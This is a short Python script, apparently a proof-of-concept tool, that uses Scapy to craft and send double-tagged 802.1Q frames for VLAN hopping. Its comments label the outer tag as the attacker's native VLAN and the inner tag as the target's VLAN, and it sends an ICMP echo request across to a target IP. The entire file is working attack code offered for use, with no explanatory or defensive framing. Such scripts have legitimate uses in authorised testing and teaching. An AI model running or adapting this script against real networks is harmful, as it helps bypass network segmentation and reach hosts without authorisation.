from scapy.all import *
import sys


def main():
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <outer_vlan_id> <inner_vlan_id> <destination_ip>")
        sys.exit(1)

    outer_vlan = int(sys.argv[1])  # attacker's VLAN
    inner_vlan = int(sys.argv[2])  # target's VLAN
    dst_ip = sys.argv[3]  # target IP

    iface = "eth0"
    src_ip = get_if_addr(iface)
    src_mac = get_if_hwaddr(iface)

    # double-tagged frame:
    # - outer 802.1Q tag: native VLAN
    # - inner 802.1Q tag: target VLAN
    pkt = (
        Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
        / Dot1Q(vlan=outer_vlan)
        / Dot1Q(vlan=inner_vlan)
        / IP(src=src_ip, dst=dst_ip)
        / ICMP()
    )

    print(f"Sending double-tagged ICMP echo request:")
    print(f"  Outer VLAN: {outer_vlan}")
    print(f"  Inner VLAN: {inner_vlan}")
    print(f"  {src_ip} -> {dst_ip}")
    pkt.show()

    sendp(pkt, iface=iface, verbose=True)


if __name__ == "__main__":
    main()
